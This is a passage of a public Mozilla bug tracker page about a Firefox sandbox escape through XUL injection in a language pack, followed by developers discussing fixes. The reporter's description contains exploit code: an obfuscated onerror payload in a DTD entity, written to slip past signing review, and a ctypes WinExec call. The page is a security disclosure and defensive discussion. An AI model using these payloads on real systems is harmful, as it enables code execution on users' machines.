      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag_type-864">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-864-dirty">
      <select id="flag_type-864" name="flag_type-864"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (1 file)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9052763">deutsch_de_language_pack_for_nightly-1715978.xpi</a>
        </div>
        <div>
            <a href="#c17" class="attach-time activity-ref"><span class="rel-time" title="2019-03-21 16:56 PDT" data-time="1553212591">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div></span>
        </div>
        <div class="attach-info">494.37 KB,
          application/x-xpinstall        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9052763&amp;action=edit">Details</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
  </div>
  
</footer>
  </div>
</section>



<script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="14003392" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" ><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" ><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:29 PDT" data-time="1553203743">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9052727"
         class="attachment"
         data-id="9052727" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="ZDI-CAN-8373-8374.zip">
      <meta itemprop="contentSize" content="1131384">
      <meta itemprop="encodingFormat" content="application/zip">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9052727" itemprop="contentUrl">
        <span id="att-9052727-description" itemprop="description">ZDI-CAN-8373-8374.zip</span></a>
        — <a href="attachment.cgi?id=9052727&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-0" data-comment-id="14003392" data-ismarkdown="true" ><h1>Sandbox escape: XUL injection in language pack</h1>
<p>With the ability to install language packs we can achieve multiple XUL injections,<br>
for example on the <code>about:telemetry</code> page. Language packs can be installed<br>
via <code>window.navigator.mozAddonManager</code> API which is accessible from a compromised<br>
renderer.</p>
<p>To exploit this issue without having to put a malicious language pack through<br>
a manual review, we turn code execution into UXSS by disabling renderer-side<br>
security checks, log into addons.mozilla.org, and use the AddonManager API<br>
to install an unlisted language pack for the en-US locale. It contains the<br>
following XML:</p>
<pre><code>&lt;!ENTITY aboutTelemetry.firefoxDataDoc &quot;Die &lt;img src=&#39;x:x&#39;
    onerror=&#39;window[`ev`+`al`](window[`at`+`ob`](`aD1sb2NhdGlvbi5oYXNoO2lmKGgpZXZhbChhdG9iKGguc2xpY2UoMSkpKQ`))&#39; /&gt;...
</code></pre>
<p>This includes some obfuscation to make it less likely to be marked for review<br>
by the signing service. With this language pack installed, we can then<br>
navigate to <code>about:telemetry#&lt;base64&gt;</code> using the IWebNavigator interface to<br>
trigger arbitrary JavaScript execution in an XUL context. The final payload is:</p>
<pre><code>let { ctypes } = Components.utils.import(&quot;resource://gre/modules/ctypes.jsm&quot;, {});
let k32 = ctypes.open(&#39;kernel32.dll&#39;);
let WinExec = k32.declare(&#39;WinExec&#39;, ctypes.winapi_abi, ctypes.int32_t, ctypes.char.ptr, ctypes.int32_t);
WinExec(&#39;calc.exe\0&#39;, 5);
</code></pre>
</div></div><div class="change-set" id="a471_451704"><div class="change" id="aa471_451704">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a471_451704"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_451704" id="a471_451704"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a471_451704"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a471_451704">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a471_451704">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:36 PDT" data-time="1553204214">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=isnotempty">status-firefox66</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=isnotempty">status-firefox67</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=%3F">?</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=isnotempty">tracking-firefox66</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="a893_280903"><div class="change" id="aa893_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a893_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a893_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a893_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a893_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a893_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:43 PDT" data-time="1553204636">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2019-9811</div></div></div><div class="change-set" id="c1"><div class="comment" data-id="14003422" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_39966" id="a893_280903"><img src="https://secure.gravatar.com/avatar/7ba0f00f24191ccef0d14185bd7ca4ca?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_39966" id="a893_280903"><a class="email " href="/user_profile?user_id=39966" > <span class="fna">Olli Pettay [:smaug]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:48 PDT" data-time="1553204918">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-1" data-comment-id="14003422" data-ismarkdown="true" ><p>Isn&#39;t this UI issue that we let installation without prompts?<br>
Or perhaps language packs should be sanitized before installing?</p>
</div></div><div class="change-set" id="a1201_1689"><div class="change" id="aa1201_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a1201_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a1201_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1201_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1201_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a1201_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:49 PDT" data-time="1553204944">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Summary: ZDI-CAN-8374 &rarr; [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack</div></div></div><div class="change-set ca-280903" id="c2"><div class="comment" data-id="14003425" data-no="2"
       data-tags="obsolete">
    
    <table class="layout-table change-head " id="ch-2" style="display:none" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a1201_1689"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a1201_1689"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" style="display:none">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:49 PDT" data-time="1553204961">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1538007&amp;comment_id=14003425"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags"><span class="comment-tag">obsolete</span>
        </td>
      </tr>
    </table>

    
      <table class="layout-table change-head default-collapsed" id="cc-2"
             role="presentation">
      <tr>
        <td class="comment-collapse-reason"
            title="abillings [3 years ago]">
            Comment hidden (obsolete)
        </td>
        <td class="comment-actions">
          <button type="button" class="change-spinner minor iconic" id="ccs-2"
                  aria-label="Expand"
                  aria-expanded="false"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </td>
      </tr>
      </table>
  </div><div
        class="comment-text markdown-body "
        id="ct-2" data-comment-id="14003425" data-ismarkdown="true"  style="display:none"><p>Removing noise since write up is posted above.</p>
</div></div><div class="change-set" id="a1544_495955"><div class="change" id="aa1544_495955">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_495955" id="a1544_495955"><img src="https://secure.gravatar.com/avatar/5aa2e382197a147b42d020b6878f8623?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_495955" id="a1544_495955"><a class="email " href="/user_profile?user_id=495955" > <span class="fna">Sylvestre Ledru [:Sylvestre]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1544_495955"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1544_495955">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a1544_495955">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:54 PDT" data-time="1553205287">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Severity: normal &rarr; blocker</div><div class="change">Priority: -- &rarr; P1</div></div></div><div class="change-set" id="c3"><div class="comment" data-id="14003442" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a1544_495955"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a1544_495955"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 14:56 PDT" data-time="1553205391">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-3" data-comment-id="14003442" data-ismarkdown="true" ><p>mozAddonManager needs to die for sure (look at the conniptions WebExtensions code goes through keeping useful extensions away from that site for fear that API will be abused). Also users assume language packs are safe (&quot;it&#39;s just text, right?&quot;) although they never have been and were treated as fully privileged legacy addons in the past for good reason.</p>
</div></div><div class="change-set" id="a2857_537703"><div class="change" id="aa2857_537703">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a2857_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_537703" id="a2857_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a2857_537703"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2857_537703">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a2857_537703">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:16 PDT" data-time="1553206600">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Component: XUL &rarr; Localization</div></div></div><div class="change-set" id="c4"><div class="comment" data-id="14003528" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2857_537703"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a2857_537703"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:22 PDT" data-time="1553206953">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1538007&amp;comment_id=14003528"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-4" data-comment-id="14003528" data-ismarkdown="true" ><p>As long as we use old-style localization with .dtds we can&#39;t prevent this kind of injection in the client. We could scan at review time for entities that contain markup if we don&#39;t rely on that in legit localizations in other contexts. At least we could prevent adding elements because a working &#39;&lt;&#39; can&#39;t be obfuscated and still work. There might be contexts where on* event handling attributes could be added and that could be more work to detect.</p>
<p>Another options would be to hold langpacks for review prior to signing, unlike WebExtensions because they have more power than web extensions. Or if we can&#39;t prevent them being signed prior to review, we can at least make them unavailable on AMO (even unlisted pages are no good) so the mozAddonManager APIs can&#39;t trigger them (I believe we did limit those APIs to only being able to launch self-hosted addons).</p>
</div></div><div class="change-set" id="c5"><div class="comment" data-id="14003532" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a2857_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a2857_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:23 PDT" data-time="1553207022">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-5" data-comment-id="14003532" data-ismarkdown="true" ><p>We can also have the parent prompt on installing a lang pack, so this can&#39;t be done silently.</p>
</div></div><div class="change-set" id="a3586_451704"><div class="change" id="aa3586_451704">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a3586_451704"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_451704" id="a3586_451704"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a3586_451704"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3586_451704">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a3586_451704">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:28 PDT" data-time="1553207329">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=isnotempty">tracking-firefox66</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=%2B">+</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=blocking">blocking</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=isnotempty">tracking-firefox67</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=equals&amp;v1=blocking">blocking</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=isnotempty">tracking-firefox68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox68&amp;o1=equals&amp;v1=blocking">blocking</a></div></div></div><div class="change-set" id="c6"><div class="comment" data-id="14003587" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a3586_451704"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a3586_451704"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c6">Comment 6</a>
          </h3>
          &bull;
